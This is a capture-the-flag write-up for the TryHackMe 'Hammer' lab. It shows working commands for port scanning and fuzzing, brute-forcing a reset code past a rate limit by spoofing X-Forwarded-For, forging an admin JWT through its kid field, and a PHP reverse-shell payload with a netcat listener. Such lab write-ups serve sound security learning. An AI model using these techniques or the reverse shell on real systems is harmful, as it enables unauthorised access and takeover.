---
creation date: 2025-02-02 01:35
modification date: Sunday 2nd February 2025 01:35:32
tags:
  - pentesting
  - writeup
  - THM
  - nmap
  - FFuF
  - bash
  - curl
  - wget
  - burp_suite
  - json_web_token
  - MFA
  - OAuth
  - netcat
---
---
# TryHackMe: Hammer CTF Challenge

***Acknowledgment***: Shout out to `hexguy` whom writeup helped me solve this box. His writeup seems to be down when last I checked.

## Add target IP to `/etc/hosts` file

```bash
sudo vim /etc/hosts
```

![Image](/images/Hammer.png)

---

## 1. Reconnaissance

It says the first flag is behind a dashboard login. 
Navigating to `http://hammer.thm/` shows an `ERR_CONNECTION_REFUSED`. 
Maybe we have the wrong port. 
Lets start with `nmap`.

---

***Note***: As a friendly reminder, `-sV` excludes port 9100, which is often the default port for printers. 
- **Don't use the `–-allports` flag unless you want to risk printing a lot of pages on a printer**. 
- Imagine staying undetected by any Intrution Detection System (IDS) or Intrusion Prevention System (IPS), just to get caught by a printer spitting out pages of nmap scans. 
- Yes, that's a thing. Google it! Use `--exclude` where necessary.

---

***Note***: **Saving the outputs to disk will help you in the long run**. 
- Reconnaissance can take multiple sessions
- it would be a shame to lose an `nmap` result that was running for quite a while.

---

### Start off simple:

- `--top-ports 20` only scans the top 20 most common ports
- `-o` outputs the standard out to a file

```bash
nmap --top-ports 20 hammer.thm -o nMap/hammer_top20_ports.txt
```

![Image](/images/Hammer-1.png)

Port 22 is open but no web-server. 

### Scan a larger range.

- `-sV` to scan for version
- `-O` for OS detection
- `-p 0-2000` to scan ports 0 through 2000
- `-oN` to output scan in normal

```bash
nmap -sV -O -p 0-2000 hammer.thm -oN nMap/hammer_p0-2000_sV_O.txt
```

![Image](/images/Hammer-2.png)

Now we get an Apache server running on port 1337.

### Rescan

Going a bit deeper on our 2 open ports

- `-A` Enables OS and version detection, script scanning, and traceroute.

```bash
nmap -A -p 22,1337 hammer.thm -oN nMap/hammer_A_p22_1337.txt
```

![Image](/images/Hammer-3.png)

Here we find:
- PHP is running because the `PHPSESSID` cookie is set.
- the cookie is missing the `HTTPOnly` flag, making it vulnerable to Cross-Site Scripting (XSS) attacks

### Recap nmap scans

**open ports**:
- 22 (ssh)
- 1337 (http)

**the website**:
- running on port 1337
- Apache server is using PHP as the programming language
- Apache/2.4.41 (Ubuntu)
- Session management is in place through the `PHPSESSID` cookie
- Apache server is exposing version, helping in finding CVEs

**Host**:
- Linux 4.15

## 2. The Website

**Going to `http://hammer.thm:1337` we are greeted with**:
- a very plain login page with an email and password form field
- a reset password functionality at `http://hammer.thm:1337/reset_password.php`

**A few things to do right away to form fields without even starting up any tools**:
1. Check for SQL injection vulnerabilities (or [Bobby Tables](https://xkcd.com/327/?ref=0x4d.ghost.io))
2. Trying random emails to find indications of different responses for an unregistered vs. registered emails
	- Are the error messages generic, or "**This email/user does not exist"** kind of messages?
3. Check for brute-force protections by simulating a few requests in short succession
	- Does it lock me out or throw CAPTCHAs at me?
4. Check whether the http responses expose anything they should not.
	- Any redirect headers, hints for the target page once login is successful, etc.
	- (You wouldn't believe what i found in HTTP requests over time - yes i am looking at you, outlook credentials in a regular API response of a community application)

### Brute-Force Protections 

After no interesting findings in step one and two, we try step 3

- I fired up a bash script to attempt to login 100 times in a row with random creds
```bash
for i in {1..100}; do
  printf "[%d] http " $i
  curl -s -w '%{http_code} size=%{size_download}\n' 'http://hammer.thm:1337/' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H 'Cache-Control: max-age=0' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Cookie: PHPSESSID=r808bg0f5uarqscv7t3ues268a' \
    -H 'DNT: 1' \
    -H 'Origin: http://hammer.thm:1337' \
    -H 'Referer: http://hammer.thm:1337/' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
    --data-raw 'email=testy%40tester.com&password=51353245711' \
    -o /dev/null \
    --insecure
done
```
- shell script adds response sizes to the output to check for deviations.
- failed logins attempts return `http 200`
- No change in the http code or size

Now, to try same thing on `.../reset_password.php`

```bash
for i in {1..100}; do
  printf "[%d] http " $i
  curl -s -w '%{http_code} size=%{size_download}\n' 'http://hammer.thm:1337/reset_password.php' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H 'Cache-Control: max-age=0' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Cookie: PHPSESSID=7acl7dfp6h1hpm2pln53qg4oqn' \
    -H 'DNT: 1' \
    -H 'Origin: http://hammer.thm:1337' \
    -H 'Referer: http://hammer.thm:1337/reset_password.php' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
    --data-raw 'email=testy%40tester.com' \
    -o /dev/null \
    --insecure
done
```

- here we get a sharp drop in `Content-Length` on the response
- from 1754 bytes to 44 bytes after 10 requests

![Image](/images/Hammer-6.png)

![Image](/images/Hammer-7.png)
- Adding verbose to the curl command reveals the issue.
- we are being throttled
- other than that nothing else interesting

### Checking HTTP Responses

Checking the website source code, we find a Dev Note:
![Image](/images/Hammer-8.png)
- keeping this in the back of mind for now

Time to enumerate the website
For this we be using `ffuf`
- `-u` - path to target
- `FUZZ` - placed where we want to fuzz
- `-w` - path to wordlist
- `-e` - to add an extension (we know the website is running PHP)
- `-c` - for colorize output
- `-ic` - ignore wordlist comments
- `-t 400` - number of concurrent threads

```bash
ffuf -u http://hammer.thm:1337/FUZZ -w /usr/.../directory-list-2.3-medium.txt -e .php -c -ic -t 400
```

![Image](/images/Hammer-9.png)

And now to try scanning `hmr_<DIRECTORY_NAME>` that was found in the source code

- simply prepend `hmr_` to the `FUZZ`
```bash
ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/.../directory-list-2.3-medium.txt -e .php -c -ic -t 400
```

![Image](/images/Hammer-10.png)

Looking through the `/hmr_logs` reveals a user 
- `tester@hammer.thm`

![Image](/images/Hammer-11.png)

Trying the user name on `/reset_password.php` to check if responses have changed

![Image](/images/Hammer-12.png)
- we get a prompt to enter a recovery code
- 4-Digit Code
- timer expires after 3 mins

Using Burp Suite to intercept the request
- type 4-digit code
- **intercept** request and send to **repeater**
![Image](/images/Hammer-14.png)

   - the timeout is handled via JavaScript
   - the timeout can be modified by sending a different value for `s`
   - rate-limited and shuts down after 10 attempts

We now have something to attack.
We need to figure out how to get pass the rate-limit.


## 3. Bypassing Multi-Factor Authentication & Rate-Limit Countermeasures

We do not know how rate-limiting is being applied.
Rate-Limiting works either one one, or combination of the following:
1. IP-Address
2. Session id
3. User or account
4. certain headers or cookies
5. endpoints/paths

The winner this time was IP-related headers
- Akamai and CloudFlare use `True-Client-IP` 
- Amazon CloudFront, AWS Elastic Load Balancing and F5 Load Balancers use `X-Forwarded-For`
	- You can have multiple layers between the user and the origin
	- `X-Forwarded-For` can actually have multiple comma-separated values#

Trying `X-Forwarded-For: 1.1.1.1` reset the rate-limit.
- Changing the IP-Address in the Header gives another 10 request before it kicks in again.
- In fact, any value, even an improperly formatted IPV4 address also worked.
![Image](/images/Hammer-15.png)

![Image](/images/Hammer-17.png)

#### Brute-Forcing the MFA

So far, the steps are as follows:
1. start the reset password process using `tester@hammer.thm`
2. the user's `PHPSESSID` is active for adding the 4-digit code for 180 seconds
3. brute-force by running from 0000 to 9999 in steps of 1
4. doing step 3 while changing the `X-Forwarded-For` either every 10 attempts, or simply every attempt

#### FUZZ The Recovery Code

Generate a file that has values from 0000 to 9999:
```bash
seq -w 0000 9999 >> codes.txt
```
- making sure to use `-w` flag, or else you will not create 4-digit numbers

Now to fire up `FFuF` and use `codes.txt`:
```bash
ffuf -u http://hammer.thm:1337/reset_password.php -w codes.txt -X "POST" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: FUZZ" -H "Cookie: PHPSESSID=<CHANGE_ME>" -d "recovery_code=FUZZ" -fr "Invalid"
```

- `-fr` - filters using regexp.
	- the failed responses include `Invalid or expired recovery code!`

- `-d` - POST data, in this case the field we want to `FUZZ`

- Replace `<CHANGE_ME>` with the current `PHPSESSID`

![Image](/images/Hammer-18.png)

![Image](/images/Hammer-20.png)
- Notice no MFA Token.
- Guessing the payload structure would have also bypassed the 4-digit MFA code

Logging in gives us our first flag.

![Image](/images/Hammer-21.png)

The site is logging us out every 20 seconds.

![Image](/images/Hammer-22.png)
- Changing the expiration date to something further in the future will prevent this
![Image](/images/Hammer-24.png)

### Remote Code Execution

In the dashboard we see some sort of system command form field.
![Image](/images/Hammer-23.png)
- most Linux commands are blocked
- we are logged in with the `user` role

Most of the files were found earlier while fuzzing directories.
- `188ade1.key` looks interesting

Lets download it using `wget`:
```bash
wget http://hammer.thm:1337/188ade1.key
```

![Image](/images/Hammer%201.png)
- not much info there

Looking at the http request and response, we notice that we are sending a JWT token in the `Authorization` header.

![Image](/images/Hammer-20%201.png)

Lets copy that and head over to `jwt.io` to get a closer look.

![Image](/images/Hammer-21%201.png)

From the image above we can notice a few things:
- the JWT token is signed with the `HS256` algorithm
	- it referencing a key located at `/var/www/mykey.key`
- the token has the `role` set to `user`
#### JWT `kid` Vulnerability

Lets start by changing the JWT `kid` to something that does not exist.

![Image](/images/Hammer-22%201.png)

- we get a `Invalid token: Key file not found` error.

This means:
- `/var/www/mykey.key` exists
- the backend is verifying its existence 

How can we use this information:
- we can have `kid` point to a file we control
	- control meaning, we can see the content and use it
- we then use the file to create a symmetric passphrase for the signature

---

***Note***: The correct thing would have been to have the key identifier that the backend could look up in an internal database and not point to a file

---

![Image](/images/Hammer-23%201.png)

- we pointed the JWT `kid` to the file `/var/www/html/188ade1.key`
- we changed our role from `user` to `admin`
- we used the contents of `188ade1.key` to sign our JWT token

![Image](/images/Hammer-24%201.png)

With that we can now run Linux commands

### Getting a Shell

For this we will use the website ***revshells.com*** to help craft a payload:

![Image](/images/Hammer-30.png)

Lets set up our listener with `netcat`
```bash
nc -lvnp 9999
```

We know the server is running PHP.
So we can use the following command via the HTTP POST requests because we can now send commands as admin.

```JSON
{"command":
"php -r '$sock=fsockopen(\"10.6.68.14\",9999);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}
```

---
***Note***: When sending commands like this through an API interface, make sure to escape the double quotes`""`, as JSON uses double quotes to define keys and values. Wrongly formatted commands will produce errors.

---

![Image](/images/Hammer-27.png)

![Image](/images/Hammer-29.png)

As we can see, we get the reverse shell.
We then navigate to `/home/ubuntu/` and `cat` the file `flag.txt`.